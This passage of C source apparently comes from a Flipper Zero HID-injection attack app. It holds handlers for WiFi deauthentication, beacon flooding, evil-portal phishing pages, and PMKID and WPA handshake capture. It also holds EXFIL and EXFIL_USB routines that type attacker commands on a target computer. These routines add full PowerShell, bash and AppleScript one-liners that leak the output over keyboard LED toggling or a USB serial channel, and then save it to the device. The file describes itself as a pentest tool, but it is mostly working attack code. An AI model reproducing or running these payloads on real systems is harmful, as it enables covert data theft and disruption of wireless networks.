        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "PORT_SCAN: ESP32 not connected, skipping");
            return;
        }
        const char* target = line + 10;
        /* Find host index by IP; default to 0 if not found */
        uint32_t host_count = 0;
        FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &host_count);
        uint8_t host_idx = 0;
        for(uint32_t i = 0; i < host_count; i++) {
            if(strcmp(hosts[i].ip, target) == 0) {
                host_idx = (uint8_t)i;
                break;
            }
        }
        fpwn_marauder_port_scan(app->marauder, host_idx, false);
        /* Wait up to 60 seconds */
        for(int i = 0; i < 600; i++) {
            furi_delay_ms(100);
            if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
        }
        return;
    }

    /* WIFI_RESULT — type accumulated WiFi scan results as keystrokes */
    if(strcmp(line, "WIFI_RESULT") == 0) {
        if(!app->marauder) {
            FURI_LOG_W(TAG, "WIFI_RESULT: no marauder, skipping");
            return;
        }
        /* Type AP results */
        uint32_t ap_count = 0;
        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
        for(uint32_t i = 0; i < ap_count; i++) {
            char buf[128];
            snprintf(
                buf,
                sizeof(buf),
                "%s  %s  %ddBm  CH%u",
                aps[i].ssid,
                aps[i].bssid,
                (int)aps[i].rssi,
                (unsigned)aps[i].channel);
            fpwn_type_string(buf);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(5);
        }
        /* Type host results */
        uint32_t host_count = 0;
        FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &host_count);
        for(uint32_t i = 0; i < host_count; i++) {
            if(!hosts[i].alive) continue;
            char buf[32];
            snprintf(buf, sizeof(buf), "%s alive", hosts[i].ip);
            fpwn_type_string(buf);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(5);
        }
        /* Type port results */
        uint32_t port_count = 0;
        FPwnPortResult* ports = fpwn_marauder_get_ports(app->marauder, &port_count);
        for(uint32_t i = 0; i < port_count; i++) {
            if(!ports[i].open) continue;
            char buf[48];
            snprintf(
                buf, sizeof(buf), "%u/tcp open %s", (unsigned)ports[i].port, ports[i].service);
            fpwn_type_string(buf);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(5);
        }
        return;
    }

    /* WIFI_WAIT <ms> — sleep for a fixed duration during WiFi operations */
    if(strncmp(line, "WIFI_WAIT ", 10) == 0) {
        uint32_t ms = (uint32_t)atoi(line + 10);
        if(ms > 60000) ms = 60000; /* cap at 60 s to prevent runaway delays */
        furi_delay_ms(ms);
        return;
    }

    /* WIFI_STOP — stop any active Marauder operation */
    if(strcmp(line, "WIFI_STOP") == 0) {
        if(app->marauder) fpwn_marauder_stop(app->marauder);
        return;
    }

    /* WIFI_DEAUTH_TARGET <SSID> — scan, find AP by SSID, targeted deauth */
    if(strncmp(line, "WIFI_DEAUTH_TARGET ", 19) == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_DEAUTH_TARGET: ESP32 not connected, skipping");
            return;
        }
        const char* target_ssid = line + 19;
        uint32_t ap_count = 0;
        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
        for(uint32_t i = 0; i < ap_count; i++) {
            if(strcmp(aps[i].ssid, target_ssid) == 0) {
                fpwn_marauder_deauth_targeted(app->marauder, (uint8_t)i);
                FURI_LOG_I(TAG, "Deauth target: %s (idx %lu)", target_ssid, (unsigned long)i);
                return;
            }
        }
        FURI_LOG_W(TAG, "WIFI_DEAUTH_TARGET: SSID '%s' not found", target_ssid);
        return;
    }

    /* WIFI_BEACON — flood area with fake beacon SSIDs */
    if(strcmp(line, "WIFI_BEACON") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_BEACON: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_beacon_spam(app->marauder);
        return;
    }

    /* WIFI_PORTAL <SSID> — start evil portal captive page with given SSID */
    if(strncmp(line, "WIFI_PORTAL ", 12) == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_PORTAL: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_evil_portal(app->marauder, line + 12);
        return;
    }

    /* WIFI_SNIFF_PMKID — start PMKID capture */
    if(strcmp(line, "WIFI_SNIFF_PMKID") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_SNIFF_PMKID: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_sniff_pmkid(app->marauder);
        return;
    }

    /* WIFI_HANDSHAKE — sniff for WPA handshakes via deauth */
    if(strcmp(line, "WIFI_HANDSHAKE") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_HANDSHAKE: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_sniff_deauth(app->marauder);
        return;
    }

    /* WIFI_SCAN_STA — start station scan and wait for results */
    if(strcmp(line, "WIFI_SCAN_STA") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_SCAN_STA: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_scan_sta(app->marauder);
        for(int i = 0; i < 100 && !app->abort_requested; i++) {
            furi_delay_ms(100);
            if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
        }
        fpwn_marauder_stop(app->marauder);
        return;
    }

    /* WIFI_PROBE — sniff probe requests for a duration */
    if(strncmp(line, "WIFI_PROBE ", 11) == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_PROBE: ESP32 not connected, skipping");
            return;
        }
        uint32_t duration_ms = (uint32_t)atoi(line + 11);
        if(duration_ms > 120000) duration_ms = 120000; /* cap 2 min */
        fpwn_marauder_sniff_probe(app->marauder);
        /* Wait for duration or abort */
        uint32_t start = furi_get_tick();
        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(duration_ms)) {
            furi_delay_ms(100);
        }
        fpwn_marauder_stop(app->marauder);
        return;
    }
    if(strcmp(line, "WIFI_PROBE") == 0) {
        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
            FURI_LOG_W(TAG, "WIFI_PROBE: ESP32 not connected, skipping");
            return;
        }
        fpwn_marauder_sniff_probe(app->marauder);
        return;
    }

    /* WIFI_STA_RESULT — type station scan results as keystrokes */
    if(strcmp(line, "WIFI_STA_RESULT") == 0) {
        if(!app->marauder) {
            FURI_LOG_W(TAG, "WIFI_STA_RESULT: no marauder, skipping");
            return;
        }
        uint32_t sta_count = 0;
        FPwnStation* stas = fpwn_marauder_get_stations(app->marauder, &sta_count);
        for(uint32_t i = 0; i < sta_count; i++) {
            char buf[96];
            snprintf(
                buf, sizeof(buf), "%s  %ddBm  %s", stas[i].mac, (int)stas[i].rssi, stas[i].ap_ssid);
            fpwn_type_string(buf);
            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
            furi_delay_ms(5);
        }
        return;
    }

    /* ---- EXFIL <command> ----
     * Types <command> on the target, appends a platform-specific one-liner that
     * transmits the command's output back via CapsLock/NumLock LED toggling:
     *   - CapsLock encodes each data bit (MSB first)
     *   - NumLock is toggled once per bit as a clock signal
     *   - Byte 0x04 (EOT) signals end of transmission
     * Flipper polls furi_hal_hid_get_led_state() at 2 ms intervals to capture
     * each bit on every NumLock edge. */
    if(strncmp(line, "EXFIL ", 6) == 0) {
        const char* cmd = line + 6;
        FPwnOS os = fpwn_effective_os(app);

        /* Allocate receive buffer if not already present */
        if(!app->exfil_buffer) {
            app->exfil_buffer = malloc(FPWN_EXFIL_MAX);
            app->exfil_capacity = FPWN_EXFIL_MAX;
        }
        app->exfil_len = 0;
        memset(app->exfil_buffer, 0, app->exfil_capacity);

        /* Phase 1: type the data-gathering command, pipe into exfil transmitter */
        fpwn_type_string(cmd);

        if(os == FPwnOSWindows) {
            /* PowerShell: capture → encode → transmit via CapsLock/NumLock */
            fpwn_type_string(" | Out-String | Set-Variable -Name _fpd; "
                             "$_w=New-Object -Com WScript.Shell; "
                             "[byte[]]$_b=[Text.Encoding]::ASCII.GetBytes("
                             "($_fpd+[char]4)); "
                             "foreach($_c in $_b){"
                             "for($_i=7;$_i -ge 0;$_i--){"
                             "$_v=($_c -shr $_i) -band 1; "
                             "if($_v -eq 1 -and !([Console]::CapsLock)){"
                             "$_w.SendKeys('{CAPSLOCK}')} "
                             "elseif($_v -eq 0 -and [Console]::CapsLock){"
                             "$_w.SendKeys('{CAPSLOCK}')}; "
                             "Start-Sleep -m 30; "
                             "$_w.SendKeys('{NUMLOCK}'); "
                             "Start-Sleep -m 30"
                             "}}");
        } else if(os == FPwnOSLinux) {
            /* Bash + xdotool: capture → transmit bit by bit.
             * _cl tracks CapsLock state so we toggle only when needed. */
            fpwn_type_string(" > /tmp/.fpd 2>&1; "
                             "_d=$(cat /tmp/.fpd; printf '\\x04'); _cl=0; "
                             "for _c in $(echo -n \"$_d\" | xxd -p | fold -w2); do "
                             "_b=$((16#$_c)); "
                             "for _i in $(seq 7 -1 0); do "
                             "_v=$(( (_b>>_i)&1 )); "
                             "if [ $_v -ne $_cl ]; then "
                             "xdotool key Caps_Lock; _cl=$_v; fi; "
                             "sleep 0.03; "
                             "xdotool key Num_Lock; "
                             "sleep 0.03; "
                             "done; done; rm -f /tmp/.fpd");
        } else if(os == FPwnOSMac) {
            /* macOS: osascript for key simulation.
             * _cl tracks CapsLock state so we toggle only when needed. */
            fpwn_type_string(
                " > /tmp/.fpd 2>&1; "
                "_d=$(cat /tmp/.fpd; printf '\\x04'); _cl=0; "
                "for _c in $(echo -n \"$_d\" | xxd -p | fold -w2); do "
                "_b=$((16#$_c)); "
                "for _i in $(seq 7 -1 0); do "
                "_v=$(( (_b>>_i)&1 )); "
                "if [ $_v -ne $_cl ]; then "
                "osascript -e 'tell application \"System Events\" to key code 57'; _cl=$_v; fi; "
                "sleep 0.03; "
                "osascript -e 'tell application \"System Events\" to key code 71'; "
                "sleep 0.03; "
                "done; done; rm -f /tmp/.fpd");
        }

        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);

        /* Phase 2: small settling delay before we start polling */
        furi_delay_ms(2000);

        /* Phase 3: LED polling receiver — runs until EOT or 10 s timeout */
        FURI_LOG_I(TAG, "EXFIL: entering receive mode");

        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->status, "Receiving data...", sizeof(m->status) - 1); },
            true);

        uint8_t initial_led = furi_hal_hid_get_led_state();
        uint8_t prev_led = initial_led;
        uint8_t current_byte = 0;
        uint8_t bit_count = 0;
        uint32_t last_clock = furi_get_tick();
        bool receiving = true;

        while(receiving && !app->abort_requested) {
            uint8_t led = furi_hal_hid_get_led_state();

            /* NumLock transition = clock edge; CapsLock = data bit */
            if((led ^ prev_led) & HID_KB_LED_NUM) {
                uint8_t data_bit = (led & HID_KB_LED_CAPS) ? 1 : 0;
                current_byte = (current_byte << 1) | data_bit;
                bit_count++;
                last_clock = furi_get_tick();

                if(bit_count == 8) {
                    if(current_byte == 0x04) {
                        /* EOT — end of transmission */
                        FURI_LOG_I(TAG, "EXFIL: EOT, %lu bytes", (unsigned long)app->exfil_len);
                        receiving = false;
                    } else if(app->exfil_len < app->exfil_capacity - 1) {
                        app->exfil_buffer[app->exfil_len++] = (char)current_byte;
                        app->exfil_buffer[app->exfil_len] = '\0';
                    }
                    current_byte = 0;
                    bit_count = 0;
                }
            }

            prev_led = led;

            /* Timeout: 10 seconds of silence = abort */
            if(furi_get_tick() - last_clock > furi_ms_to_ticks(10000)) {
                FURI_LOG_W(TAG, "EXFIL: timeout, %lu bytes", (unsigned long)app->exfil_len);
                receiving = false;
            }

            furi_delay_ms(2); /* 2 ms poll — fast enough for 30 ms clock period */
        }

        /* Restore CapsLock and NumLock to their pre-exfil state */
        {
            uint8_t final_led = furi_hal_hid_get_led_state();
            if((final_led ^ initial_led) & HID_KB_LED_CAPS) {
                furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
                furi_delay_ms(2);
                furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
                furi_delay_ms(50);
            }
            if((final_led ^ initial_led) & HID_KB_LED_NUM) {
                furi_hal_hid_kb_press(HID_KEYPAD_NUMLOCK);
                furi_delay_ms(2);
                furi_hal_hid_kb_release(HID_KEYPAD_NUMLOCK);
                furi_delay_ms(50);
            }
        }

        /* Phase 4: save received data to SD card */
        if(app->exfil_len > 0) {
            storage_simply_mkdir(app->storage, FPWN_EXFIL_DIR);

            char exfil_path[128];
            uint32_t ts = furi_get_tick() / 1000;
            snprintf(
                exfil_path,
                sizeof(exfil_path),
                "%s/exfil_%lu.txt",
                FPWN_EXFIL_DIR,
                (unsigned long)ts);

            File* ef = storage_file_alloc(app->storage);
            if(storage_file_open(ef, exfil_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
                storage_file_write(ef, app->exfil_buffer, (uint16_t)app->exfil_len);
                storage_file_close(ef);
                FURI_LOG_I(
                    TAG, "EXFIL: saved %lu bytes to %s", (unsigned long)app->exfil_len, exfil_path);
            }
            storage_file_free(ef);

            with_view_model(
                app->execute_view,
                FPwnExecModel * m,
                {
                    snprintf(
                        m->status,
                        sizeof(m->status),
                        "Exfil: %lu bytes saved",
                        (unsigned long)app->exfil_len);
                },
                true);
        } else {
            with_view_model(
                app->execute_view,
                FPwnExecModel * m,
                { strncpy(m->status, "Exfil: no data received", sizeof(m->status) - 1); },
                true);
        }

        return;
    }

    /* ---- EXFIL_USB <command> ----
     * High-bandwidth exfiltration via USB CDC serial (~115200 baud).
     *
     * Phase 1 (HID): Types a script that (a) runs <command> and buffers output,
     *   (b) snapshots existing serial ports, (c) polls for a NEW serial port
     *   (the Flipper re-enumerating as CDC) and writes the buffered data + EOT.
     * Phase 2 (Delay): Waits EXFIL_USB_DELAY ms (default 5000) for the target
     *   script to finish executing and snapshot existing ports.
     * Phase 3 (Switch): Switches USB from HID to CDC single and sets callbacks.
     * Phase 4 (Receive): Polls furi_hal_cdc_receive() until EOT (0x04) or timeout.
     * Phase 5 (Restore): Switches back to HID, saves data to SD card.
     *
     * Configurable via variables:
     *   SET EXFIL_USB_DELAY  <ms>   — pre-switch delay (default 5000, min 1000, max 30000)
     *   SET EXFIL_USB_TIMEOUT <ms>  — receive timeout (default 20000, min 5000, max 60000)
     *
     * NOTE: <command> is typed verbatim into the target shell (same as EXFIL).
     * The operator controls .fpwn module content — this is by design for a pentest tool.
     */
    if(strncmp(line, "EXFIL_USB ", 10) == 0) {
        const char* cmd = line + 10;
        FPwnOS os = fpwn_effective_os(app);

        /* Allocate receive buffer if not already present */
        if(!app->exfil_buffer) {
            app->exfil_buffer = malloc(FPWN_EXFIL_MAX);
            app->exfil_capacity = FPWN_EXFIL_MAX;
        }
        app->exfil_len = 0;
        memset(app->exfil_buffer, 0, app->exfil_capacity);

        /* Phase 1: Type OS-specific exfil-via-serial script.
         * The script runs the command, captures output, snapshots existing serial
         * ports, then polls until a new port appears (the Flipper CDC device). */
        if(os == FPwnOSWindows) {
            /* PowerShell: capture output, snapshot COM ports, poll for new one,
             * open serial port, write data + EOT byte, close. */
            fpwn_type_string("$_t=[IO.Ports.SerialPort]; "
                             "$_d=(");
            fpwn_type_string(cmd);
            fpwn_type_string(")|Out-String; "
                             "$_p=$_t::GetPortNames(); "
                             "1..40|%{sleep -m 500; "
                             "$_n=$_t::GetPortNames()|?{$_ -notin $_p}; "
                             "if($_n){"
                             "$_s=$_t::new($_n[0],115200); "
                             "$_s.Open(); "
                             "[byte[]]$_b=[Text.Encoding]::ASCII.GetBytes($_d+[char]4); "
                             "$_s.Write($_b,0,$_b.Length); "
                             "$_s.Close(); break}}");
        } else if(os == FPwnOSLinux) {
            /* Bash: capture output, snapshot /dev/ttyACM*, poll for new device,
             * configure with stty, write data + EOT. */
            fpwn_type_string("_d=$(");
            fpwn_type_string(cmd);
            fpwn_type_string(" 2>&1); "
                             "_p=$(ls -1 /dev/ttyACM* 2>/dev/null); "
                             "for _i in $(seq 40); do sleep .5; "
                             "for _v in /dev/ttyACM*; do [ -c \"$_v\" ] || continue; "
                             "echo \"$_p\"|grep -qxF \"$_v\" && continue; "
                             "stty -F \"$_v\" 115200 raw -echo 2>/dev/null && "
                             "{ printf '%s\\004' \"$_d\" > \"$_v\"; break 2; }; "
                             "done; done");
        } else if(os == FPwnOSMac) {
            /* macOS: same as Linux but /dev/cu.usbmodem* and stty -f */
            fpwn_type_string("_d=$(");
            fpwn_type_string(cmd);
            fpwn_type_string(" 2>&1); "
                             "_p=$(ls -1 /dev/cu.usbmodem* 2>/dev/null); "
                             "for _i in $(seq 40); do sleep .5; "
                             "for _v in /dev/cu.usbmodem*; do [ -c \"$_v\" ] || continue; "
                             "echo \"$_p\"|grep -qxF \"$_v\" && continue; "
                             "stty -f \"$_v\" 115200 raw 2>/dev/null && "
                             "{ printf '%s\\004' \"$_d\" > \"$_v\"; break 2; }; "
                             "done; done");
        }

        /* Press Enter to launch the script on the target */
        furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
        furi_delay_ms(2);
        furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);

        /* Phase 2: Baked-in delay — lets the target script execute the command
         * and snapshot existing ports BEFORE we switch USB modes. */
        uint32_t switch_delay = 5000;
        {
            const char* dv = fpwn_var_get("EXFIL_USB_DELAY");
            if(dv) switch_delay = (uint32_t)atoi(dv);
            if(switch_delay < 1000) switch_delay = 1000;
            if(switch_delay > 30000) switch_delay = 30000;
        }

        FURI_LOG_I(
            TAG, "EXFIL_USB: waiting %lu ms before CDC switch", (unsigned long)switch_delay);
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->status, "Running cmd on target...", sizeof(m->status) - 1); },
            true);

        /* Wait in 100 ms increments so abort is responsive */
        for(uint32_t w = 0; w < switch_delay && !app->abort_requested; w += 100) {
            furi_delay_ms(100);
        }
        if(app->abort_requested) return;

        /* Phase 3: Switch USB from HID to CDC single */
        FURI_LOG_I(TAG, "EXFIL_USB: switching to CDC");
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->status, "CDC mode - receiving...", sizeof(m->status) - 1); },
            true);

        s_cdc_rx_pending = false;

        furi_hal_usb_unlock();
        furi_hal_usb_set_config(&usb_cdc_single, NULL);
        furi_delay_ms(100); /* Let USB stack settle */

        CdcCallbacks cdc_cb = {
            .tx_ep_callback = NULL,
            .rx_ep_callback = fpwn_cdc_rx_callback,
            .state_callback = fpwn_cdc_state_callback,
            .ctrl_line_callback = NULL,
            .config_callback = NULL,
        };
        furi_hal_cdc_set_callbacks(0, &cdc_cb, app);

        /* Phase 4: Receive loop — poll CDC until EOT or timeout */
        uint32_t rx_timeout = 20000;
        {
            const char* tv = fpwn_var_get("EXFIL_USB_TIMEOUT");
            if(tv) rx_timeout = (uint32_t)atoi(tv);
            if(rx_timeout < 5000) rx_timeout = 5000;
            if(rx_timeout > 60000) rx_timeout = 60000;
        }

        uint32_t rx_start = furi_get_tick();
        bool got_eot = false;

        while(!app->abort_requested && !got_eot) {
            if(furi_get_tick() - rx_start > furi_ms_to_ticks(rx_timeout)) {
                FURI_LOG_W(TAG, "EXFIL_USB: timeout, %lu bytes", (unsigned long)app->exfil_len);
                break;
            }

            if(s_cdc_rx_pending) {
                s_cdc_rx_pending = false;
                __DMB(); /* Memory barrier — ensure flag clear is visible before read */

                /* Drain all queued packets (ISR may batch multiple 64-byte frames) */
                uint8_t rxbuf[CDC_DATA_SZ];
                int32_t rxlen;
                while((rxlen = furi_hal_cdc_receive(0, rxbuf, CDC_DATA_SZ)) > 0 && !got_eot) {
                    for(int32_t ri = 0; ri < rxlen && !got_eot; ri++) {
                        if(rxbuf[ri] == 0x04) {
                            got_eot = true;
                            FURI_LOG_I(
                                TAG, "EXFIL_USB: EOT, %lu bytes", (unsigned long)app->exfil_len);
                        } else if(app->exfil_len < app->exfil_capacity - 1) {
                            app->exfil_buffer[app->exfil_len++] = (char)rxbuf[ri];
                            app->exfil_buffer[app->exfil_len] = '\0';
                        } else {
                            FURI_LOG_W(
                                TAG,
                                "EXFIL_USB: buffer full at %lu bytes, truncating",
                                (unsigned long)app->exfil_len);
                            got_eot = true; /* Stop receiving — buffer is full */
                        }
                    }
                }
            }

            furi_delay_ms(5); /* Yield — 5 ms poll is plenty for 115200 baud */
        }

        /* Unregister CDC callbacks before switching back */
        furi_hal_cdc_set_callbacks(0, NULL, NULL);

        /* Phase 5: Switch back to HID */
        FURI_LOG_I(TAG, "EXFIL_USB: switching back to HID");
        furi_hal_usb_unlock();
        furi_hal_usb_set_config(&usb_hid, NULL);
        furi_delay_ms(2000); /* Wait for HID re-enumeration on target */

        /* Update UI with result */
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            {
                snprintf(
                    m->status,
                    sizeof(m->status),
                    "USB exfil: %lu bytes",
                    (unsigned long)app->exfil_len);
            },
            true);

        /* Save received data to SD card */
        if(app->exfil_len > 0) {
            storage_simply_mkdir(app->storage, FPWN_EXFIL_DIR);

            char exfil_path[128];
            uint32_t ts = furi_get_tick() / 1000;
            snprintf(
                exfil_path,
                sizeof(exfil_path),
                "%s/exfil_usb_%lu.txt",
                FPWN_EXFIL_DIR,
                (unsigned long)ts);

            File* ef = storage_file_alloc(app->storage);
            if(storage_file_open(ef, exfil_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
                storage_file_write(ef, app->exfil_buffer, (uint16_t)app->exfil_len);
                storage_file_close(ef);
                FURI_LOG_I(
                    TAG,
                    "EXFIL_USB: saved %lu bytes to %s",
                    (unsigned long)app->exfil_len,
                    exfil_path);
            }
            storage_file_free(ef);
        } else {
            with_view_model(
                app->execute_view,
                FPwnExecModel * m,
                { strncpy(m->status, "USB exfil: no data received", sizeof(m->status) - 1); },
                true);
        }

        return;
    }

    /* ---- Mouse HID commands ---- */

    /* MOUSE_MOVE <dx> <dy> — relative mouse movement (int8_t range: -127..127) */
    if(strncmp(line, "MOUSE_MOVE ", 11) == 0) {
        int dx = 0, dy = 0;
        const char* args = line + 11;
        dx = atoi(args);
        const char* sp = strchr(args, ' ');
        if(sp) dy = atoi(sp + 1);
        /* Clamp to int8_t range */
        if(dx > 127) dx = 127;
        if(dx < -127) dx = -127;
        if(dy > 127) dy = 127;
        if(dy < -127) dy = -127;
        furi_hal_hid_mouse_move((int8_t)dx, (int8_t)dy);
        return;
    }

    /* MOUSE_CLICK [LEFT|RIGHT|MIDDLE] — click and release (default LEFT) */
    if(strncmp(line, "MOUSE_CLICK", 11) == 0) {
        uint8_t btn = HID_MOUSE_BTN_LEFT;
        if(line[11] == ' ') {
            const char* bname = line + 12;
            if(strcmp(bname, "RIGHT") == 0)
                btn = HID_MOUSE_BTN_RIGHT;
            else if(strcmp(bname, "MIDDLE") == 0)
                btn = HID_MOUSE_BTN_WHEEL;
        }
        furi_hal_hid_mouse_press(btn);
        furi_delay_ms(5);
        furi_hal_hid_mouse_release(btn);
        return;
    }

    /* MOUSE_PRESS [LEFT|RIGHT|MIDDLE] — press without releasing (for drag) */
    if(strncmp(line, "MOUSE_PRESS", 11) == 0) {
        uint8_t btn = HID_MOUSE_BTN_LEFT;
        if(line[11] == ' ') {
            const char* bname = line + 12;
            if(strcmp(bname, "RIGHT") == 0)
                btn = HID_MOUSE_BTN_RIGHT;
            else if(strcmp(bname, "MIDDLE") == 0)
                btn = HID_MOUSE_BTN_WHEEL;
        }
        furi_hal_hid_mouse_press(btn);
        return;
    }

    /* MOUSE_RELEASE [LEFT|RIGHT|MIDDLE] — release a held button */
    if(strncmp(line, "MOUSE_RELEASE", 13) == 0) {
        uint8_t btn = HID_MOUSE_BTN_LEFT;
        if(line[13] == ' ') {
            const char* bname = line + 14;
            if(strcmp(bname, "RIGHT") == 0)
                btn = HID_MOUSE_BTN_RIGHT;
            else if(strcmp(bname, "MIDDLE") == 0)
                btn = HID_MOUSE_BTN_WHEEL;
        }
        furi_hal_hid_mouse_release(btn);
        return;
    }

    /* MOUSE_SCROLL <delta> — scroll wheel (positive=up, negative=down) */
    if(strncmp(line, "MOUSE_SCROLL ", 13) == 0) {
        int delta = atoi(line + 13);
        if(delta > 127) delta = 127;
        if(delta < -127) delta = -127;
        furi_hal_hid_mouse_scroll((int8_t)delta);
        return;
    }

    /* ---- PRINT <text> — display a message on the Flipper screen ---- */
    if(strncmp(line, "PRINT ", 6) == 0) {
        char expanded[FPWN_MAX_LINE_LEN];
        fpwn_var_substitute(line + 6, expanded, sizeof(expanded));
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            {
                size_t pl = strlen(expanded);
                if(pl > sizeof(m->status) - 1) pl = sizeof(m->status) - 1;
                memcpy(m->status, expanded, pl);
                m->status[pl] = '\0';
            },
            true);
        FURI_LOG_I(TAG, "PRINT: %s", expanded);
        return;
    }

    /* ---- MINIMIZE_ALL — minimize all windows (OS-aware) ---- */
    if(strcmp(line, "MINIMIZE_ALL") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            /* Win+D = show desktop */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_D);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_D);
        } else if(os == FPwnOSMac) {
            /* Cmd+Option+H+M = hide all + minimize front */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_H);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_H);
            furi_delay_ms(200);
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_M);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_M);
        } else {
            /* Linux: Super+D (GNOME/KDE show desktop) */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_D);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_D);
        }
        furi_delay_ms(500);
        return;
    }

    /* ---- LOCK_SCREEN — lock the target workstation (OS-aware) ---- */
    if(strcmp(line, "LOCK_SCREEN") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            /* Win+L */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_L);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_L);
        } else if(os == FPwnOSMac) {
            /* Ctrl+Cmd+Q */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_GUI | HID_KEYBOARD_Q);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_GUI | HID_KEYBOARD_Q);
        } else {
            /* Super+L (GNOME) */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | HID_KEYBOARD_L);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | HID_KEYBOARD_L);
        }
        return;
    }

    /* ---- SCREENSHOT — capture screenshot (OS-aware) ---- */
    if(strcmp(line, "SCREENSHOT") == 0) {
        FPwnOS os = fpwn_effective_os(app);
        if(os == FPwnOSWindows) {
            /* Win+Shift+S (Snipping Tool) */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_S);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_S);
        } else if(os == FPwnOSMac) {
            /* Cmd+Shift+3 (full screen) */
            furi_hal_hid_kb_press(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_3);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(KEY_MOD_LEFT_GUI | KEY_MOD_LEFT_SHIFT | HID_KEYBOARD_3);
        } else {
            /* PrintScreen */
            furi_hal_hid_kb_press(HID_KEYBOARD_PRINT_SCREEN);
            furi_delay_ms(30);
            furi_hal_hid_kb_release(HID_KEYBOARD_PRINT_SCREEN);
        }
        furi_delay_ms(500);
        return;
    }

    /* ---- INJECT <filename> — execute another .fpwn file inline ---- */
    if(strncmp(line, "INJECT ", 7) == 0) {
        /* Guard: max 4 levels of INJECT nesting (~2.5 KB stack per level) */
        if(s_inject_depth >= 4) {
            FURI_LOG_W(TAG, "INJECT: max depth 4 exceeded, skipping");
            return;
        }
        s_inject_depth++;

        const char* inject_name = line + 7;
        char inject_path[FPWN_PATH_LEN];

